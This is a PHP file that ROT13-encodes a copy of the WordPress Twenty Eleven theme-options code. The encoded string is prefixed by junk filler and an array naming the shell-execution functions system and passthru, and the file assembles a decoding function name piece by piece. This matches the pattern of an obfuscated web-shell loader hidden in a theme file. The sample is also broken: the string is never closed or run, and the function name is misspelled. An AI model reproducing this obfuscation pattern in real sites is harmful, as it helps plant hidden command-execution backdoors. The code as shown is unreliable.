<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gjragl Ryrira Gurzr Bcgvbaf
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Ryrira
 * @fvapr Gjragl Ryrira 1.0
 */

/**
 * Cebcreyl radhrhr fglyrf naq fpevcgf sbe bhe gurzr bcgvbaf cntr.
 *
 * Guvf shapgvba vf nggnpurq gb gur nqzva_radhrhr_fpevcgf npgvba ubbx.
 *
 * @fvapr Gjragl Ryrira 1.0
 *
 * @cnenz fgevat $ubbx_fhssvk Na nqzva cntr'f ubbx fhssvk.
 */
shapgvba gjraglryrira_nqzva_radhrhr_fpevcgf( $ubbx_fhssvk ) {
	jc_radhrhr_fglyr( 'gjraglryrira-gurzr-bcgvbaf', trg_grzcyngr_qverpgbel_hev() . '/vap/gurzr-bcgvbaf.pff', snyfr, '20110602' );
	jc_radhrhr_fpevcg( 'gjraglryrira-gurzr-bcgvbaf', trg_grzcyngr_qverpgbel_hev() . '/vap/gurzr-bcgvbaf.wf', neenl( 'sneognfgvp' ), '20110610' );
	jc_radhrhr_fglyr( 'sneognfgvp' );
}
nqq_npgvba( 'nqzva_cevag_fglyrf-nccrnenapr_cntr_gurzr_bcgvbaf', 'gjraglryrira_nqzva_radhrhr_fpevcgf' );

/**
 * Ertvfgre gur sbez frggvat sbe bhe gjraglryrira_bcgvbaf neenl.
 *
 * Guvf shapgvba vf nggnpurq gb gur nqzva_vavg npgvba ubbx.
 *
 * Guvf pnyy gb ertvfgre_frggvat() ertvfgref n inyvqngvba pnyyonpx, gjraglryrira_gurzr_bcgvbaf_inyvqngr(),
 * juvpu vf hfrq jura gur bcgvba vf fnirq, gb rafher gung bhe bcgvba inyhrf ner pbzcyrgr, cebcreyl
 * sbeznggrq, naq fnsr.
 *
 * @fvapr Gjragl Ryrira 1.0
 */
shapgvba gjraglryrira_gurzr_bcgvbaf_vavg() {

	ertvfgre_frggvat(
		'gjraglryrira_bcgvbaf',               // Bcgvbaf tebhc, frr frggvatf_svryqf() pnyy va gjraglryrira_gurzr_bcgvbaf_eraqre_cntr().
		'gjraglryrira_gurzr_bcgvbaf',         // Qngnonfr bcgvba, frr gjraglryrira_trg_gurzr_bcgvbaf().
		'gjraglryrira_gurzr_bcgvbaf_inyvqngr' // Gur fnavgvmngvba pnyyonpx, frr gjraglryrira_gurzr_bcgvbaf_inyvqngr().
	);

	// Ertvfgre bhe frggvatf svryq tebhc.
	nqq_frggvatf_frpgvba(
		'trareny',        // Havdhr vqragvsvre sbe gur frggvatf frpgvba.
		'',               // Frpgvba gvgyr (jr qba'g jnag bar).
		'__erghea_snyfr', // Frpgvba pnyyonpx (jr qba'g jnag nalguvat).
		'gurzr_bcgvbaf'   // Zrah fyht, hfrq gb havdhryl vqragvsl gur cntr; frr gjraglryrira_gurzr_bcgvbaf_nqq_cntr().
	);

	// Ertvfgre bhe vaqvivqhny frggvatf svryqf.
	nqq_frggvatf_svryq(
		'pbybe_fpurzr',                             // Havdhr vqragvsvre sbe gur svryq sbe guvf frpgvba.
		__( 'Pbybe Fpurzr', 'gjraglryrira' ),       // Frggvat svryq ynory.
		'gjraglryrira_frggvatf_svryq_pbybe_fpurzr', // Shapgvba gung eraqref gur frggvatf svryq.
		'gurzr_bcgvbaf',                            // Zrah fyht, hfrq gb havdhryl vqragvsl gur cntr; frr gjraglryrira_gurzr_bcgvbaf_nqq_cntr().
		'trareny'                                   // Frggvatf frpgvba. Fnzr nf gur svefg nethzrag va gur nqq_frggvatf_frpgvba() nobir.
	);

	nqq_frggvatf_svryq( 'yvax_pbybe', __( 'Yvax Pbybe', 'gjraglryrira' ), 'gjraglryrira_frggvatf_svryq_yvax_pbybe', 'gurzr_bcgvbaf', 'trareny' );
	nqq_frggvatf_svryq( 'ynlbhg', __( 'Qrsnhyg Ynlbhg', 'gjraglryrira' ), 'gjraglryrira_frggvatf_svryq_ynlbhg', 'gurzr_bcgvbaf', 'trareny' );
}
nqq_npgvba( 'nqzva_vavg', 'gjraglryrira_gurzr_bcgvbaf_vavg' );

/**
 * Punatr gur pncnovyvgl erdhverq gb fnir gur 'gjraglryrira_bcgvbaf' bcgvbaf tebhc.
 *
 * @frr gjraglryrira_gurzr_bcgvbaf_vavg()     Svefg cnenzrgre gb ertvfgre_frggvat() vf gur anzr bs gur bcgvbaf tebhc.
 * @frr gjraglryrira_gurzr_bcgvbaf_nqq_cntr() Gur rqvg_gurzr_bcgvbaf pncnovyvgl vf hfrq sbe ivrjvat gur cntr.
 *
 * Ol qrsnhyg, gur bcgvbaf tebhcf sbe nyy ertvfgrerq frggvatf erdhver gur znantr_bcgvbaf pncnovyvgl.
 * Guvf svygre vf erdhverq gb punatr bhe gurzr bcgvbaf cntr gb rqvg_gurzr_bcgvbaf vafgrnq.
 * Ol qrsnhyg, bayl nqzvavfgengbef unir rvgure bs gurfr pncnovyvgvrf, ohg gur qrfver urer vf
 * gb nyybj sbe svare-tenvarq pbageby sbe ebyrf naq hfref.
 *
 * @cnenz fgevat $pncnovyvgl Gur pncnovyvgl hfrq sbe gur cntr, juvpu vf znantr_bcgvbaf ol qrsnhyg.
 * @erghea fgevat Gur pncnovyvgl gb npghnyyl hfr.
 */
shapgvba gjraglryrira_bcgvba_cntr_pncnovyvgl( $pncnovyvgl ) {
	erghea 'rqvg_gurzr_bcgvbaf';
}
nqq_svygre( 'bcgvba_cntr_pncnovyvgl_gjraglryrira_bcgvbaf', 'gjraglryrira_bcgvba_cntr_pncnovyvgl' );

/**
 * Nqq n gurzr bcgvbaf cntr gb gur nqzva zrah, vapyhqvat fbzr uryc qbphzragngvba.
 *
 * Guvf shapgvba vf nggnpurq gb gur nqzva_zrah npgvba ubbx.
 *
 * @fvapr Gjragl Ryrira 1.0
 */
shapgvba gjraglryrira_gurzr_bcgvbaf_nqq_cntr() {
	$gurzr_cntr = nqq_gurzr_cntr(
		__( 'Gurzr Bcgvbaf', 'gjraglryrira' ),   // Anzr bs cntr.
		__( 'Gurzr Bcgvbaf', 'gjraglryrira' ),   // Ynory va zrah.
		'rqvg_gurzr_bcgvbaf',                    // Pncnovyvgl erdhverq.
		'gurzr_bcgvbaf',                         // Zrah fyht, hfrq gb havdhryl vqragvsl gur cntr.
		'gjraglryrira_gurzr_bcgvbaf_eraqre_cntr' // Shapgvba gung eraqref gur bcgvbaf cntr.
	);

	vs ( ! $gurzr_cntr ) {
		erghea;
	}

	nqq_npgvba( \"ybnq-{$gurzr_cntr}\", 'gjraglryrira_gurzr_bcgvbaf_uryc' );
}
nqq_npgvba( 'nqzva_zrah', 'gjraglryrira_gurzr_bcgvbaf_nqq_cntr' );

shapgvba gjraglryrira_gurzr_bcgvbaf_uryc() {

	$uryc = '<c>' . __( 'Fbzr gurzrf cebivqr phfgbzvmngvba bcgvbaf gung ner tebhcrq gbtrgure ba n Gurzr Bcgvbaf fperra. Vs lbh punatr gurzrf, bcgvbaf znl punatr be qvfnccrne, nf gurl ner gurzr-fcrpvsvp. Lbhe pheerag gurzr, Gjragl Ryrira, cebivqrf gur sbyybjvat Gurzr Bcgvbaf:', 'gjraglryrira' ) . '</c>' .
			'<by>' .
				'<yv>' . __( '<fgebat>Pbybe Fpurzr</fgebat>: Lbh pna pubbfr n pbybe cnyrggr bs \"Yvtug\" (yvtug onpxtebhaq jvgu qnex grkg) be \"Qnex\" (qnex onpxtebhaq jvgu yvtug grkg) sbe lbhe fvgr.', 'gjraglryrira' ) . '</yv>' .
				'<yv>' . __( '<fgebat>Yvax Pbybe</fgebat>: Lbh pna pubbfr gur pbybe hfrq sbe grkg yvaxf ba lbhe fvgr. Lbh pna ragre gur UGZY pbybe be urk pbqr, be lbh pna pubbfr ivfhnyyl ol pyvpxvat gur \"Fryrpg n Pbybe\" ohggba gb cvpx sebz n pbybe jurry.', 'gjraglryrira' ) . '</yv>' .
				'<yv>' . __( '<fgebat>Qrsnhyg Ynlbhg</fgebat>: Lbh pna pubbfr vs lbh jnag lbhe fvgr&#8217;f qrsnhyg ynlbhg gb unir n fvqrone ba gur yrsg, gur evtug, be abg ng nyy.', 'gjraglryrira' ) . '</yv>' .
			'</by>' .
			'<c>' . __( 'Erzrzore gb pyvpx \"Fnir Punatrf\" gb fnir nal punatrf lbh unir znqr gb gur gurzr bcgvbaf.', 'gjraglryrira' ) . '</c>';

	$fvqrone = '<c><fgebat>' . __( 'Sbe zber vasbezngvba:', 'gjraglryrira' ) . '</fgebat></c>' .
		'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/phfgbzvmre/\" gnetrg=\"_oynax\">Qbphzragngvba ba Gurzr Phfgbzvmngvba</n>', 'gjraglryrira' ) . '</c>' .
		'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\" gnetrg=\"_oynax\">Fhccbeg sbehzf</n>', 'gjraglryrira' ) . '</c>';

	$fperra = trg_pheerag_fperra();

	vs ( zrgubq_rkvfgf( $fperra, 'nqq_uryc_gno' ) ) {
		// JbeqCerff 3.3.0.
		$fperra->nqq_uryc_gno(
			neenl(
				'gvgyr'   => __( 'Bireivrj', 'gjraglryrira' ),
				'vq'      => 'gurzr-bcgvbaf-uryc',
				'pbagrag' => $uryc,
			)
		);

		$fperra->frg_uryc_fvqrone( $fvqrone );
	} ryfr {
		// JbeqCerff 3.2.0.
		nqq_pbagrkghny_uryc( $fperra, $uryc . $fvqrone );
	}
}

/**
 * Erghea na neenl bs pbybe fpurzrf ertvfgrerq sbe Gjragl Ryrira.
 *
 * @fvapr Gjragl Ryrira 1.0
 */
shapgvba gjraglryrira_pbybe_fpurzrf() {
	$pbybe_fpurzr_bcgvbaf = neenl(
		'yvtug' => neenl(
			'inyhr'              => 'yvtug',
			'ynory'              => __( 'Yvtug', 'gjraglryrira' ),
			'guhzoanvy'          => trg_grzcyngr_qverpgbel_hev() . '/vap/vzntrf/yvtug.cat',
			'qrsnhyg_yvax_pbybe' => '#1o8or0',
		),
		'qnex'  => neenl(
			'inyhr'              => 'qnex',
			'ynory'              => __( 'Qnex', 'gjraglryrira' ),
			'guhzoanvy'          => trg_grzcyngr_qverpgbel_hev() . '/vap/vzntrf/qnex.cat',
			'qrsnhyg_yvax_pbybe' => '#r4741s',
		),
	);

	/**
	 * Svygref gur Gjragl Ryrira pbybe fpurzr bcgvbaf.
	 *
	 * @fvapr Gjragl Ryrira 1.0
	 *
	 * @cnenz neenl $pbybe_fpurzr_bcgvbaf Na nffbpvngvir neenl bs pbybe fpurzr bcgvbaf.
	 */
	erghea nccyl_svygref( 'gjraglryrira_pbybe_fpurzrf', $pbybe_fpurzr_bcgvbaf );
}

/**
 * Erghea na neenl bs ynlbhg bcgvbaf ertvfgrerq sbe Gjragl Ryrira.
 *
 * @fvapr Gjragl Ryrira 1.0
 */
shapgvba gjraglryrira_ynlbhgf() {
	$ynlbhg_bcgvbaf = neenl(
		'pbagrag-fvqrone' => neenl(
			'inyhr'     => 'pbagrag-fvqrone',
			'ynory'     => __( 'Pbagrag ba yrsg', 'gjraglryrira' ),
			'guhzoanvy' => trg_grzcyngr_qverpgbel_hev() . '/vap/vzntrf/pbagrag-fvqrone.cat',
		),
		'fvqrone-pbagrag' => neenl(
			'inyhr'     => 'fvqrone-pbagrag',
			'ynory'     => __( 'Pbagrag ba evtug', 'gjraglryrira' ),
			'guhzoanvy' => trg_grzcyngr_qverpgbel_hev() . '/vap/vzntrf/fvqrone-pbagrag.cat',
		),
		'pbagrag'         => neenl(
			'inyhr'     => 'pbagrag',
			'ynory'     => __( 'Bar-pbyhza, ab fvqrone', 'gjraglryrira' ),
			'guhzoanvy' => trg_grzcyngr_qverpgbel_hev() . '/vap/vzntrf/pbagrag.cat',
		),
	);

	/**
	 * Svygref gur Gjragl Ryrira ynlbhg bcgvbaf.
	 *
	 * @fvapr Gjragl Ryrira 1.0
	 *
	 * @cnenz neenl $ynlbhg_bcgvbaf Na nffbpvngvir neenl bs ynlbhg bcgvbaf.
	 */
	erghea nccyl_svygref( 'gjraglryrira_ynlbhgf', $ynlbhg_bcgvbaf );
}

/**
 * Erghea gur qrsnhyg bcgvbaf sbe Gjragl Ryrira.
 *
 * @fvapr Gjragl Ryrira 1.0
 *
 * @erghea neenl Na neenl bs qrsnhyg gurzr bcgvbaf.
 */
shapgvba gjraglryrira_trg_qrsnhyg_gurzr_bcgvbaf() {
	$qrsnhyg_gurzr_bcgvbaf = neenl(
		'pbybe_fpurzr' => 'yvtug',
		'yvax_pbybe'   => gjraglryrira_trg_qrsnhyg_yvax_pbybe( 'yvtug' ),
		'gurzr_ynlbhg' => 'pbagrag-fvqrone',
	);

	vs ( vf_egy() ) {
		$qrsnhyg_gurzr_bcgvbaf['gurzr_ynlbhg'] = 'fvqrone-pbagrag';
	}

	/**
	 * Svygref gur Gjragl Ryrira qrsnhyg bcgvbaf.
	 *
	 * @fvapr Gjragl Ryrira 1.0
	 *
	 * @cnenz neenl $qrsnhyg_gurzr_bcgvbaf Na neenl bs qrsnhyg gurzr bcgvbaf.
	 */
	erghea nccyl_svygref( 'gjraglryrira_qrsnhyg_gurzr_bcgvbaf', $qrsnhyg_gurzr_bcgvbaf );
}

/**
 * Erghea gur qrsnhyg yvax pbybe sbe Gjragl Ryrira, onfrq ba pbybe fpurzr.
 *
 * @fvapr Gjragl Ryrira 1.0
 *
 * @cnenz fgevat $pbybe_fpurzr Bcgvbany. Pbybe fpurzr.
 *                             Qrsnhyg ahyy (be gur npgvir pbybe fpurzr).
 * @erghea fgevat Gur qrsnhyg yvax pbybe.
 */
shapgvba gjraglryrira_trg_qrsnhyg_yvax_pbybe( $pbybe_fpurzr = ahyy ) {
	vs ( ahyy === $pbybe_fpurzr ) {
		$bcgvbaf      = gjraglryrira_trg_gurzr_bcgvbaf();
		$pbybe_fpurzr = $bcgvbaf['pbybe_fpurzr'];
	}

	$pbybe_fpurzrf = gjraglryrira_pbybe_fpurzrf();
	vs ( ! vffrg( $pbybe_fpurzrf[ $pbybe_fpurzr ] ) ) {
		erghea snyfr;
	}

	erghea $pbybe_fpurzrf[ $pbybe_fpurzr ]['qrsnhyg_yvax_pbybe'];
}

/**
 * Erghea gur bcgvbaf neenl sbe Gjragl Ryrira.
 *
 * @fvapr Gjragl Ryrira 1.0
 */
shapgvba gjraglryrira_trg_gurzr_bcgvbaf() {
	erghea trg_bcgvba( 'gjraglryrira_gurzr_bcgvbaf', gjraglryrira_trg_qrsnhyg_gurzr_bcgvbaf() );
}

/**
 * Eraqre gur Pbybe Fpurzr frggvat svryq.
 *
 * @fvapr Gjragl Ryrira 1.3
 */
shapgvba gjraglryrira_frggvatf_svryq_pbybe_fpurzr() {
	$bcgvbaf = gjraglryrira_trg_gurzr_bcgvbaf();

	sbernpu ( gjraglryrira_pbybe_fpurzrf() nf $fpurzr ) {
		?>
	<qvi pynff=\"ynlbhg vzntr-enqvb-bcgvba pbybe-fpurzr\">
	<ynory pynff=\"qrfpevcgvba\">
		<vachg glcr=\"enqvb\" anzr=\"gjraglryrira_gurzr_bcgvbaf[pbybe_fpurzr]\" inyhr=\"<?cuc rpub rfp_ngge( $fpurzr['inyhr'] ); ?>\" <?cuc purpxrq( $bcgvbaf['pbybe_fpurzr'], $fpurzr['inyhr'] ); ?> />
		<vachg glcr=\"uvqqra\" vq=\"qrsnhyg-pbybe-<?cuc rpub rfp_ngge( $fpurzr['inyhr'] ); ?>\" inyhr=\"<?cuc rpub rfp_ngge( $fpurzr['qrsnhyg_yvax_pbybe'] ); ?>\" />
		<fcna>
			<vzt fep=\"<?cuc rpub rfp_hey( $fpurzr['guhzoanvy'] ); ?>\" jvqgu=\"136\" urvtug=\"122\" nyg=\"\" />
			<?cuc rpub rfp_ugzy( $fpurzr['ynory'] ); ?>
		</fcna>
	</ynory>
	</qvi>
		<?cuc
	}
}

/**
 * Eraqre gur Yvax Pbybe frggvat svryq.
 *
 * @fvapr Gjragl Ryrira 1.3
 */
shapgvba gjraglryrira_frggvatf_svryq_yvax_pbybe() {
	$bcgvbaf = gjraglryrira_trg_gurzr_bcgvbaf();
	?>
	<vachg glcr=\"grkg\" anzr=\"gjraglryrira_gurzr_bcgvbaf[yvax_pbybe]\" vq=\"yvax-pbybe\" inyhr=\"<?cuc rpub rfp_ngge( $bcgvbaf['yvax_pbybe'] ); ?>\" />
	<n uers=\"#\" pynff=\"cvpxpbybe uvqr-vs-ab-wf\" vq=\"yvax-pbybe-rknzcyr\"></n>
	<vachg glcr=\"ohggba\" pynff=\"cvpxpbybe ohggba uvqr-vs-ab-wf\" inyhr=\"<?cuc rfp_ngge_r( 'Fryrpg n Pbybe', 'gjraglryrira' ); ?>\" />
	<qvi vq=\"pbybeCvpxreQvi\" fglyr=\"m-vaqrk: 100; onpxtebhaq:#rrr; obeqre:1ck fbyvq #ppp; cbfvgvba:nofbyhgr; qvfcynl:abar;\"></qvi>
	<oe />
	<fcna>
	<?cuc
	/* genafyngbef: %f: Yvax pbybe. */
	cevags( __( 'Qrsnhyg pbybe: %f', 'gjraglryrira' ), '<fcna vq=\"qrsnhyg-pbybe\">' . gjraglryrira_trg_qrsnhyg_yvax_pbybe( $bcgvbaf['pbybe_fpurzr'] ) . '</fcna>' );
	?>
	</fcna>
	<?cuc
}

/**
 * Eraqre gur Ynlbhg frggvat svryq.
 *
 * @fvapr Gjragl Ryrira 1.3
 */
shapgvba gjraglryrira_frggvatf_svryq_ynlbhg() {
	$bcgvbaf = gjraglryrira_trg_gurzr_bcgvbaf();
	sbernpu ( gjraglryrira_ynlbhgf() nf $ynlbhg ) {
		?>
		<qvi pynff=\"ynlbhg vzntr-enqvb-bcgvba gurzr-ynlbhg\">
		<ynory pynff=\"qrfpevcgvba\">
			<vachg glcr=\"enqvb\" anzr=\"gjraglryrira_gurzr_bcgvbaf[gurzr_ynlbhg]\" inyhr=\"<?cuc rpub rfp_ngge( $ynlbhg['inyhr'] ); ?>\" <?cuc purpxrq( $bcgvbaf['gurzr_ynlbhg'], $ynlbhg['inyhr'] ); ?> />
			<fcna>
				<vzt fep=\"<?cuc rpub rfp_hey( $ynlbhg['guhzoanvy'] ); ?>\" jvqgu=\"136\" urvtug=\"122\" nyg=\"\" />
				<?cuc rpub rfp_ugzy( $ynlbhg['ynory'] ); ?>
			</fcna>
		</ynory>
		</qvi>
		<?cuc
	}
}

/**
 * Eraqre gur gurzr bcgvbaf cntr sbe Gjragl Ryrira.
 *
 * @fvapr Gjragl Ryrira 1.2
 */
shapgvba gjraglryrira_gurzr_bcgvbaf_eraqre_cntr() {
	$gurzr_anzr = shapgvba_rkvfgf( 'jc_trg_gurzr' ) ? jc_trg_gurzr()->qvfcynl( 'Anzr' ) : trg_bcgvba( 'pheerag_gurzr' );
	?>
	<qvi pynff=\"jenc\">
		<u2>
		<?cuc
		/* genafyngbef: %f: Gurzr anzr. */
		cevags( __( '%f Gurzr Bcgvbaf', 'gjraglryrira' ), $gurzr_anzr );
		?>
		</u2>
		<?cuc frggvatf_reebef(); ?>

		<sbez zrgubq=\"cbfg\" npgvba=\"bcgvbaf.cuc\">
			<?cuc
				frggvatf_svryqf( 'gjraglryrira_bcgvbaf' );
				qb_frggvatf_frpgvbaf( 'gurzr_bcgvbaf' );
				fhozvg_ohggba();
			?>
		</sbez>
	</qvi>
	<?cuc
}

/**
 * Fnavgvmr naq inyvqngr sbez vachg.
 *
 * Npprcgf na neenl, erghea n fnavgvmrq neenl.
 *
 * @frr gjraglryrira_gurzr_bcgvbaf_vavg()
 * @gbqb frg hc Erfrg Bcgvbaf npgvba
 *
 * @fvapr Gjragl Ryrira 1.0
 *
 * @cnenz neenl $vachg Na neenl bs sbez vachg.
 */
shapgvba gjraglryrira_gurzr_bcgvbaf_inyvqngr( $vachg ) {
	$qrsnhygf = gjraglryrira_trg_qrsnhyg_gurzr_bcgvbaf();
	$bhgchg   = $qrsnhygf;

	// Pbybe fpurzr zhfg or va bhe neenl bs pbybe fpurzr bcgvbaf.
	vs ( vffrg( $vachg['pbybe_fpurzr'] ) && neenl_xrl_rkvfgf( $vachg['pbybe_fpurzr'], gjraglryrira_pbybe_fpurzrf() ) ) {
		$bhgchg['pbybe_fpurzr'] = $vachg['pbybe_fpurzr'];
	}

	// Bhe qrsnhygf sbe gur yvax pbybe znl unir punatrq, onfrq ba gur pbybe fpurzr.
	$qrsnhygf['yvax_pbybe'] = gjraglryrira_trg_qrsnhyg_yvax_pbybe( $bhgchg['pbybe_fpurzr'] );
	$bhgchg['yvax_pbybe']   = $qrsnhygf['yvax_pbybe'];

	// Yvax pbybe zhfg or 3 be 6 urknqrpvzny punenpgref.
	vs ( vffrg( $vachg['yvax_pbybe'] ) && cert_zngpu( '/^#?([n-s0-9]{3}){1,2}$/v', $vachg['yvax_pbybe'] ) ) {
		$bhgchg['yvax_pbybe'] = '#' . fgegbybjre( ygevz( $vachg['yvax_pbybe'], '#' ) );
	}

	// Gurzr ynlbhg zhfg or va bhe neenl bs gurzr ynlbhg bcgvbaf.
	vs ( vffrg( $vachg['gurzr_ynlbhg'] ) && neenl_xrl_rkvfgf( $vachg['gurzr_ynlbhg'], gjraglryrira_ynlbhgf() ) ) {
		$bhgchg['gurzr_ynlbhg'] = $vachg['gurzr_ynlbhg'];
	}

	/**
	 * Svygref gur Gjragl Ryrira fnavgvmrq sbez vachg neenl.
	 *
	 * @fvapr Gjragl Ryrira 1.0
	 *
	 * @cnenz neenl $bhgchg   Na neenl bs fnavgvmrq sbez bhgchg.
	 * @cnenz neenl $vachg    Na neenl bs ha-fnavgvmrq sbez vachg.
	 * @cnenz neenl $qrsnhygf Na neenl bs qrsnhyg gurzr bcgvbaf.
	 */
	erghea nccyl_svygref( 'gjraglryrira_gurzr_bcgvbaf_inyvqngr', $bhgchg, $vachg, $qrsnhygf );
}

/**
 * Radhrhr gur fglyrf sbe gur pheerag pbybe fpurzr.
 *
 * @fvapr Gjragl Ryrira 1.0
 */
shapgvba gjraglryrira_radhrhr_pbybe_fpurzr() {
	$bcgvbaf      = gjraglryrira_trg_gurzr_bcgvbaf();
	$pbybe_fpurzr = $bcgvbaf['pbybe_fpurzr'];

	vs ( 'qnex' === $pbybe_fpurzr ) {
		jc_radhrhr_fglyr( 'qnex', trg_grzcyngr_qverpgbel_hev() . '/pbybef/qnex.pff', neenl(), '20240603' );
	}

	/**
	 * Sverf nsgre gur fglyrf sbe gur Gjragl Ryrira pbybe fpurzr ner radhrhrq.
	 *
	 * @fvapr Gjragl Ryrira 1.0
	 *
	 * @cnenz fgevat $pbybe_fpurzr Gur pbybe fpurzr.
	 */
	qb_npgvba( 'gjraglryrira_radhrhr_pbybe_fpurzr', $pbybe_fpurzr );
}
nqq_npgvba( 'jc_radhrhr_fpevcgf', 'gjraglryrira_radhrhr_pbybe_fpurzr' );

/**
 * Nqq n fglyr oybpx gb gur gurzr sbe gur pheerag yvax pbybe.
 *
 * Guvf shapgvba vf nggnpurq gb gur jc_urnq npgvba ubbx.
 *
 * @fvapr Gjragl Ryrira 1.0
 */
shapgvba gjraglryrira_cevag_yvax_pbybe_fglyr() {
	$bcgvbaf    = gjraglryrira_trg_gurzr_bcgvbaf();
	$yvax_pbybe = $bcgvbaf['yvax_pbybe'];

	$qrsnhyg_bcgvbaf = gjraglryrira_trg_qrsnhyg_gurzr_bcgvbaf();

	// Qba'g qb nalguvat vs gur pheerag yvax pbybe vf gur qrsnhyg.
	vs ( $qrsnhyg_bcgvbaf['yvax_pbybe'] === $yvax_pbybe ) {
		erghea;
	}
	?>
	<fglyr>
		/* Yvax pbybe */
		n,
		#fvgr-gvgyr n:sbphf,
		#fvgr-gvgyr n:ubire,
		#fvgr-gvgyr n:npgvir,
		.ragel-gvgyr n:ubire,
		.ragel-gvgyr n:sbphf,
		.ragel-gvgyr n:npgvir,
		.jvqtrg_gjraglryrira_rcurzren .pbzzragf-yvax n:ubire,
		frpgvba.erprag-cbfgf .bgure-erprag-cbfgf n[ery=\"obbxznex\"]:ubire,
		frpgvba.erprag-cbfgf .bgure-erprag-cbfgf .pbzzragf-yvax n:ubire,
		.sbezng-vzntr sbbgre.ragel-zrgn n:ubire,
		#fvgr-trarengbe n:ubire {
			pbybe: <?cuc rpub $yvax_pbybe; ?>;
		}
		frpgvba.erprag-cbfgf .bgure-erprag-cbfgf .pbzzragf-yvax n:ubire {
			obeqre-pbybe: <?cuc rpub $yvax_pbybe; ?>;
		}
		negvpyr.srngher-vzntr.fznyy .ragel-fhzznel c n:ubire,
		.ragel-urnqre .pbzzragf-yvax n:ubire,
		.ragel-urnqre .pbzzragf-yvax n:sbphf,
		.ragel-urnqre .pbzzragf-yvax n:npgvir,
		.srngher-fyvqre n.npgvir {
			onpxtebhaq-pbybe: <?cuc rpub $yvax_pbybe; ?>;
		}
	</fglyr>
	<?cuc
}
nqq_npgvba( 'jc_urnq', 'gjraglryrira_cevag_yvax_pbybe_fglyr' );

/**
 * Nqq Gjragl Ryrira ynlbhg pynffrf gb gur neenl bs obql pynffrf.
 *
 * @fvapr Gjragl Ryrira 1.0
 *
 * @cnenz neenl $rkvfgvat_pynffrf Na neenl bs rkvfgvat obql pynffrf.
 */
shapgvba gjraglryrira_ynlbhg_pynffrf( $rkvfgvat_pynffrf ) {
	$bcgvbaf        = gjraglryrira_trg_gurzr_bcgvbaf();
	$pheerag_ynlbhg = $bcgvbaf['gurzr_ynlbhg'];

	vs ( va_neenl( $pheerag_ynlbhg, neenl( 'pbagrag-fvqrone', 'fvqrone-pbagrag' ), gehr ) ) {
		$pynffrf = neenl( 'gjb-pbyhza' );
	} ryfr {
		$pynffrf = neenl( 'bar-pbyhza' );
	}

	vs ( 'pbagrag-fvqrone' === $pheerag_ynlbhg ) {
		$pynffrf[] = 'evtug-fvqrone';
	} ryfrvs ( 'fvqrone-pbagrag' === $pheerag_ynlbhg ) {
		$pynffrf[] = 'yrsg-fvqrone';
	} ryfr {
		$pynffrf[] = $pheerag_ynlbhg;
	}

	/**
	 * Svygref gur Gjragl Ryrira ynlbhg obql pynffrf.
	 *
	 * @fvapr Gjragl Ryrira 1.0
	 *
	 * @cnenz neenl  $pynffrf        Na neenl bs obql pynffrf.
	 * @cnenz fgevat $pheerag_ynlbhg Gur pheerag gurzr ynlbhg.
	 */
	$pynffrf = nccyl_svygref( 'gjraglryrira_ynlbhg_pynffrf', $pynffrf, $pheerag_ynlbhg );

	erghea neenl_zretr( $rkvfgvat_pynffrf, $pynffrf );
}
nqq_svygre( 'obql_pynff', 'gjraglryrira_ynlbhg_pynffrf' );

/**
 * Vzcyrzragf Gjragl Ryrira gurzr bcgvbaf vagb Phfgbzvmre
 *
 * @fvapr Gjragl Ryrira 1.3
 *
 * @cnenz JC_Phfgbzvmr_Znantre $jc_phfgbzvmr Phfgbzvmre bowrpg.
 */
shapgvba gjraglryrira_phfgbzvmr_ertvfgre( $jc_phfgbzvmr ) {
	$jc_phfgbzvmr->trg_frggvat( 'oybtanzr' )->genafcbeg         = 'cbfgZrffntr';
	$jc_phfgbzvmr->trg_frggvat( 'oybtqrfpevcgvba' )->genafcbeg  = 'cbfgZrffntr';
	$jc_phfgbzvmr->trg_frggvat( 'urnqre_grkgpbybe' )->genafcbeg = 'cbfgZrffntr';

	vs ( vffrg( $jc_phfgbzvmr->fryrpgvir_erserfu ) ) {
		$jc_phfgbzvmr->fryrpgvir_erserfu->nqq_cnegvny(
			'oybtanzr',
			neenl(
				'fryrpgbe'            => '#fvgr-gvgyr n',
				'pbagnvare_vapyhfvir' => snyfr,
				'eraqre_pnyyonpx'     => 'gjraglryrira_phfgbzvmr_cnegvny_oybtanzr',
			)
		);
		$jc_phfgbzvmr->fryrpgvir_erserfu->nqq_cnegvny(
			'oybtqrfpevcgvba',
			neenl(
				'fryrpgbe'            => '#fvgr-qrfpevcgvba',
				'pbagnvare_vapyhfvir' => snyfr,
				'eraqre_pnyyonpx'     => 'gjraglryrira_phfgbzvmr_cnegvny_oybtqrfpevcgvba',
			)
		);
	}

	$bcgvbaf  = gjraglryrira_trg_gurzr_bcgvbaf();
	$qrsnhygf = gjraglryrira_trg_qrsnhyg_gurzr_bcgvbaf();

	$jc_phfgbzvmr->nqq_frggvat(
		'gjraglryrira_gurzr_bcgvbaf[pbybe_fpurzr]',
		neenl(
			'qrsnhyg'    => $qrsnhygf['pbybe_fpurzr'],
			'glcr'       => 'bcgvba',
			'pncnovyvgl' => 'rqvg_gurzr_bcgvbaf',
		)
	);

	$fpurzrf = gjraglryrira_pbybe_fpurzrf();
	$pubvprf = neenl();
	sbernpu ( $fpurzrf nf $fpurzr ) {
		$pubvprf[ $fpurzr['inyhr'] ] = $fpurzr['ynory'];
	}

	$jc_phfgbzvmr->nqq_pbageby(
		'gjraglryrira_pbybe_fpurzr',
		neenl(
			'ynory'    => __( 'Pbybe Fpurzr', 'gjraglryrira' ),
			'frpgvba'  => 'pbybef',
			'frggvatf' => 'gjraglryrira_gurzr_bcgvbaf[pbybe_fpurzr]',
			'glcr'     => 'enqvb',
			'pubvprf'  => $pubvprf,
			'cevbevgl' => 5,
		)
	);

	// Yvax Pbybe (nqqrq gb Pbybe Fpurzr frpgvba va Phfgbzvmre).
